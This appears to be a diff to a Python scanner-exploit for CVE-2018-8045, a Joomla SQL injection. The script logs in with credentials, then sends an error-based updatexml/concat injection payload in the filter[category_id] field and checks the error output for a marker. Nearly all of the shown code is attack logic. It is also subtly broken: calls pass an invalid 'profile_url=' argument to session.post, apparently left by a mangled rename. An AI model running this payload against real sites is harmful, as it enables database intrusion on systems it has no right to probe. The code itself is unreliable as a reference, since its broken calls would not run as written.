@@ -27,7 +27,7 @@ def get_pass(profile_url):
     if match:
         value, token = match[0][0], match[0][1]
         headers = {
-            "Content-Type": "application/x-www-form-profile_urlencoded"
+            "Content-Type": "application/x-www-form-urlencoded"
         }
         pass_payload = f'username={user}&passwd={passwd}&option=com_login&task=login&return={value}&{token}=1'
         session.post(profile_url=login_profile_url, headers=headers, data=pass_payload, verify=False)
@@ -43,7 +43,7 @@ def execute_sqli(profile_url, session, headers):
     sqli_payload = f'filter[search]=&list[fullordering]=a.review_time DESC&list[limit]=20&filter[published]=1&filter[category_id]=(updatexml(2,concat(0x7e,(md5({rand_str}))),0))'
 
     r = session.post(profile_url=sqli_profile_url, headers=headers, data=sqli_payload, verify=False)
-    if r.status_code == 500 and hashlib.md5(rand_str).hexdigest()[:31] in r.content:
+    if r.status_code == 500 and hashlib.md5(rand_str.encode()).hexdigest()[:31] in r.content.decode():
         print(f"{Fore.GREEN}{Style.BRIGHT}SQL Injection Successful! Exploit profile_url: {sqli_profile_url}{Style.RESET_ALL}")
     else:
         print(f"{Fore.RED}SQL Injection Failed!{Style.RESET_ALL}")
@@ -54,3 +54,7 @@ def scan_cve_2018_8045(target):
 
     if session and headers:
         execute_sqli(target, session, headers)
+    else:
+        return False  # Added return here if login fails
+
+    return True  # Indicate successful execution
